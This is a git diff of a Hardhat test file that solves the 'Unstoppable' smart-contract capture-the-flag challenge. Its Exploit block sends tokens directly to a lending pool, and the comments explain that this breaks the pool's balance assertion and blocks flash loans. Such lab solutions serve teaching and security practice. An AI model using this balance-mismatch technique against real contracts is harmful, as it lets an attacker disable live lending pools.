@@ -29,6 +29,10 @@ describe('[Challenge] Unstoppable', function () {
         ).to.equal(TOKENS_IN_POOL);
 
         expect(
+            await this.pool.poolBalance()
+        ).to.equal(TOKENS_IN_POOL);
+
+        expect(
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
@@ -40,6 +44,12 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // we can send tokens to the pool directly via token.transfer
+        // this will create a mismatch between token.balance(pool) and poolBalance
+        // making the `assert(poolBalance == balanceBefore);` fail on line 40
+        await this.token.connect(deployer).transfer(this.pool.address, "10");
+        console.log((await this.token.balanceOf(this.pool.address)).toString())
+        console.log((await this.pool.poolBalance()).toString())
     });
 
     after(async function () {
